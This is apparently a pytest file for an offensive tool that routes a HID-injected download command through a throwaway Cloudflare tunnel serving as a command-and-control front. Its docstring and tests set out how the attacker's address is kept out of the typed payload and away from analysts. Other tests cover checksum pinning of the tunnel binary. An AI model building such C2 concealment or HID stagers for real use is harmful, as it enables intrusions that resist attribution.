"""The public hop (`c2.front`) — the address a HID board types is not ours.

A tunnel is the answer to "the payload must not carry our IP", because a hash
cannot be dialled: anything the TARGET can reconstruct, an analyst holding the
board can reconstruct too. What DOES hold is indirection — the typed string
names a throwaway public host, and that host forwards to the local listener.

These tests pin the three things that silently broke the chain when this was
wired up by hand:

  * reading the assigned hostname out of cloudflared's banner;
  * `c2.front` actually reaching the artefact (`payload hid` used to be handed
    the listener's own address, so the front never entered the typed command);
  * no bogus "port mismatch" warning when the port belongs to the edge.
"""
import hashlib
import io
import tarfile
import urllib.request

from phantom.utils import network
from phantom.utils import tunnel as tn
from phantom.utils.short_stager import hid_download_command

FRONT = "quiet-river-9081.trycloudflare.com"


class _Bytes(io.BytesIO):
    """A urlopen response over fixed bytes (context-manager shape included)."""

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False


def _tarball(member: str, payload: bytes) -> bytes:
    """A gzipped tar with exactly one regular file."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as archive:
        info = tarfile.TarInfo(member)
        info.size = len(payload)
        archive.addfile(info, io.BytesIO(payload))
    return buf.getvalue()


def test_parse_public_url_from_banner():
    banner = ("2026-11-01T10:00:00Z INF |  https://quiet-river-9081."
              "trycloudflare.com  |")
    assert tn.parse_public_url(banner) == (
        "https://quiet-river-9081.trycloudflare.com")
    assert tn.parse_public_url("starting tunnel") == ""


def test_host_of_is_the_form_c2_front_expects():
    assert tn.host_of("https://quiet-river-9081.trycloudflare.com") == (
        "quiet-river-9081.trycloudflare.com:443")
    assert tn.host_of("") == ""


def test_front_outranks_the_local_address(monkeypatch):
    monkeypatch.delenv("PHANTOM_C2_HOST", raising=False)
    monkeypatch.setenv("PHANTOM_C2_FRONT", f"{FRONT}:443")
    ep = network.c2_endpoint_status(host="192.168.1.155")
    assert (ep.host, ep.port, ep.use_ssl) == (FRONT, 443, True)
    assert ep.via_front is True


def test_front_does_not_raise_a_port_mismatch_warning(monkeypatch):
    monkeypatch.delenv("PHANTOM_C2_HOST", raising=False)
    monkeypatch.setenv("PHANTOM_C2_FRONT", f"{FRONT}:443")
    # A live listener on another port is the NORMAL shape behind a front.
    ep = network.C2Endpoint(FRONT, 443, True, True, 9443, False,
                            via_front=True)
    problems = [p for p in ep.warnings() if "MISMATCH" in p]
    assert problems == []


def test_hid_command_carries_the_front_and_no_lan_ip(monkeypatch):
    monkeypatch.delenv("PHANTOM_C2_HOST", raising=False)
    monkeypatch.setenv("PHANTOM_C2_FRONT", f"{FRONT}:443")
    ep = network.c2_endpoint_status()
    command = hid_download_command("windows", ep.host, ep.port, token="t0k",
                                   ssl=ep.use_ssl, attempts=1)
    assert FRONT in command
    assert "192.168." not in command
    assert len(command) <= 250      # the Windows Run dialog's own limit


def test_explicit_host_override_still_wins(monkeypatch):
    monkeypatch.setenv("PHANTOM_C2_FRONT", f"{FRONT}:443")
    monkeypatch.setenv("PHANTOM_C2_HOST", "10.1.2.3")
    ep = network.c2_endpoint_status()
    assert ep.host == "10.1.2.3"
    assert ep.via_front is False


def test_install_extracts_a_tarball_asset(monkeypatch, tmp_path):
    """macOS ships `cloudflared-darwin-*.tgz`.

    Writing those bytes straight to `data/bin/cloudflared` and chmod-ing them
    does not produce an executable, so on that platform `install` reported
    success and every `tunnel start` then said "not found". The extraction
    branch must write the MEMBER, not the archive.
    """
    asset = "cloudflared-darwin-arm64.tgz"
    monkeypatch.setattr(tn, "BIN_DIR", tmp_path)
    monkeypatch.setattr(tn, "_asset_name", lambda: asset)
    monkeypatch.setattr(tn, "_runs", lambda path: True)
    monkeypatch.setattr(tn, "_MIN_INSTALL_BYTES", 1)  # a fixture-sized tarball
    blob = _tarball("cloudflared", b"#!/bin/sh\necho cloudflared version 1\n")
    # The download is authenticated against the pinned release, so this fixture
    # pins ITS OWN digest. The check is not disabled: the bytes below must be
    # the bytes the (patched) table names, exactly as a real release is.
    monkeypatch.setattr(tn, "_PINNED_SHA256",
                        {**tn._PINNED_SHA256,
                         asset: hashlib.sha256(blob).hexdigest()})

    class _Resp(io.BytesIO):
        def __enter__(self):
            return self

        def __exit__(self, *exc):
            return False

    monkeypatch.setattr(urllib.request, "urlopen", lambda *a, **k: _Resp(blob))

    path, err = tn.install()
    assert err == ""
    written = open(path, "rb").read()
    # the EXECUTABLE, not the archive that wrapped it
    assert written.startswith(b"#!/bin/sh")
    assert b"\x1f\x8b" not in written[:4]


def test_install_writes_exactly_the_verified_bytes(monkeypatch, tmp_path):
    """A digest check that is followed by writing DIFFERENT bytes is theatre."""
    asset = "cloudflared-linux-amd64"
    blob = b"\x7fELF" + b"\x00" * 64
    monkeypatch.setattr(tn, "BIN_DIR", tmp_path)
    monkeypatch.setattr(tn, "_asset_name", lambda: asset)
    monkeypatch.setattr(tn, "_runs", lambda path: True)
    monkeypatch.setattr(tn, "_MIN_INSTALL_BYTES", 1)
    monkeypatch.setattr(tn, "_PINNED_SHA256",
                        {**tn._PINNED_SHA256,
                         asset: hashlib.sha256(blob).hexdigest()})
    monkeypatch.setattr(urllib.request, "urlopen",
                        lambda *a, **k: _Bytes(blob))

    path, err = tn.install()
    assert err == ""
    assert open(path, "rb").read() == blob


def test_install_refuses_bytes_that_do_not_match_the_pinned_digest(
        monkeypatch, tmp_path):
    """The whole point of the pin: a substituted asset installs nothing.

    Before this check the only test was "the file runs", which a hijacked
    download can satisfy. Here the bytes are valid-looking and still rejected,
    no executable is left behind for `find_binary()` to pick up, and no `.part`
    survives to be resumed.
    """
    asset = "cloudflared-linux-amd64"
    monkeypatch.setattr(tn, "BIN_DIR", tmp_path)
    monkeypatch.setattr(tn, "_asset_name", lambda: asset)
    monkeypatch.setattr(tn, "_MIN_INSTALL_BYTES", 1)

    def _must_not_run(path):
        raise AssertionError("a rejected download must never be executed")

    monkeypatch.setattr(tn, "_runs", _must_not_run)
    monkeypatch.setattr(urllib.request, "urlopen",
                        lambda *a, **k: _Bytes(b"#!/bin/sh\necho not it\n"))

    path, err = tn.install()
    assert path == ""
    assert "SHA-256 mismatch" in err
    assert tn._PINNED_VERSION in err
    assert hashlib.sha256(b"#!/bin/sh\necho not it\n").hexdigest() in err
    assert not (tmp_path / tn.binary_name()).exists()
    assert list(tmp_path.glob("*.part")) == []


def test_an_asset_with_no_pinned_digest_is_refused_outright(
        monkeypatch, tmp_path):
    """No pin, no download: falling back to an unverified fetch defeats it."""
    monkeypatch.setattr(tn, "BIN_DIR", tmp_path)
    monkeypatch.setattr(tn, "_asset_name",
                        lambda: "cloudflared-freebsd-amd64")

    def _no_download(*a, **k):
        raise AssertionError("an unpinned asset must not even be downloaded")

    monkeypatch.setattr(urllib.request, "urlopen", _no_download)

    path, err = tn.install()
    assert path == ""
    assert "no pinned SHA-256" in err
    assert tn._PINNED_VERSION in err
    assert "cloudflared-freebsd-amd64" in err
    assert not (tmp_path / tn.binary_name()).exists()


def test_apply_and_clear_front(monkeypatch):
    monkeypatch.delenv("PHANTOM_C2_FRONT", raising=False)
    assert tn.apply_front("https://quiet-river-9081.trycloudflare.com") == (
        f"{FRONT}:443")
    assert tn.current_front() == f"{FRONT}:443"
    tn.clear_front()
    assert tn.current_front() == ""
